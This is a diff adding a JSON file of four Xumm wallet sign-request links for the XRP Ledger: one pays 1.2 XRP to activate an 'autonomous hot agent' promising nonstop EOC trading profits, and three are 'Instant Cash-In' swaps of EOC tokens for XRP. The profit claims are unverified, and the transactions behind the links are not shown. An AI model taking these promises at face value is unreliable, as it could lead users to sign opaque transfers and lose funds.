@@ -1,0 +1,30 @@
+{
+  "hot_agent_activation": {
+    "title": "1. Activate Autonomous Hot Agent (1.2 XRP Gas)",
+    "uuid": "5816160d-6ae8-4f25-b7fa-1dc8c0a86a22",
+    "always": "https://xumm.app/sign/5816160d-6ae8-4f25-b7fa-1dc8c0a86a22",
+    "qr_png": "https://xumm.app/sign/5816160d-6ae8-4f25-b7fa-1dc8c0a86a22_q.png",
+    "instruction": "Activate dedicated agent rDpqGT...6nvw with 1.2 XRP to trade EOC nonstop and sweep all profits back to you"
+  },
+  "swap_1_5_xrp": {
+    "title": "2. Instant Cash-In: +1.500000 XRP Cash",
+    "uuid": "01729364-b689-4970-af08-a526df73db7e",
+    "always": "https://xumm.app/sign/01729364-b689-4970-af08-a526df73db7e",
+    "qr_png": "https://xumm.app/sign/01729364-b689-4970-af08-a526df73db7e_q.png",
+    "instruction": "Swap ~3.43B EOC directly with AMM to deposit +1.500000 XRP cash into wallet immediately"
+  },
+  "swap_2_0_xrp": {
+    "title": "3. Instant Cash-In: +2.000000 XRP Cash",
+    "uuid": "4870e530-b51e-4823-9207-d6e62034cbbf",
+    "always": "https://xumm.app/sign/4870e530-b51e-4823-9207-d6e62034cbbf",
+    "qr_png": "https://xumm.app/sign/4870e530-b51e-4823-9207-d6e62034cbbf_q.png",
+    "instruction": "Swap ~3.62B EOC directly with AMM to deposit +2.000000 XRP cash into wallet immediately"
+  },
+  "swap_0_75_xrp": {
+    "title": "4. Instant Cash-In: +0.750000 XRP Cash",
+    "uuid": "b082e8f2-6d61-474d-823e-a4c7a54025a3",
+    "always": "https://xumm.app/sign/b082e8f2-6d61-474d-823e-a4c7a54025a3",
+    "qr_png": "https://xumm.app/sign/b082e8f2-6d61-474d-823e-a4c7a54025a3_q.png",
+    "instruction": "Swap ~1.50B EOC directly with AMM to deposit +0.750000 XRP cash into wallet immediately"
+  }
+}
